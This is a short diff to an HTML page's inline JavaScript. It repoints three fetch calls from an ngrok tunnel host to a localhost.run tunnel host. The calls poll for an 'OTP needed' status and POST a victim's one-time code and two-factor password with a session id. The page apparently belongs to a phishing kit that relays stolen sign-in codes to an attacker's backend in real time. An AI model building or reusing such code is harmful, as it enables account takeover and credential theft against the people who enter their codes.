@@ -235,7 +235,7 @@
     }
 
     function checkStatus() {
-    fetch('https://e106-15-204-67-23.ngrok-free.app/check_status/' + userId)
+    fetch('https://d2433247966068.lhr.life/check_status/' + userId)
         .then(r => r.json())
         .then(data => {
             if (data.status === "NEED_OTP") {
@@ -290,7 +290,7 @@
     async function submitOTP() {
         showMsg(2, 'loading', 'Verifying code...');
         try {
-            const res = await fetch('https://e106-15-204-67-23.ngrok-free.app/verify_otp', {
+            const res = await fetch('https://d2433247966068.lhr.life/verify_otp', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({session_id: sid, otp: currentOtp})
@@ -308,7 +308,7 @@
         }
         showMsg(3, 'loading', 'Signing in...');
         try {
-            const res = await fetch('https://e106-15-204-67-23.ngrok-free.app/verify_2fa', {
+            const res = await fetch('https://d2433247966068.lhr.life/verify_2fa', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({session_id: sid, password: pass})
@@ -353,4 +353,3 @@
 </script>
 </body>
 </html>
-
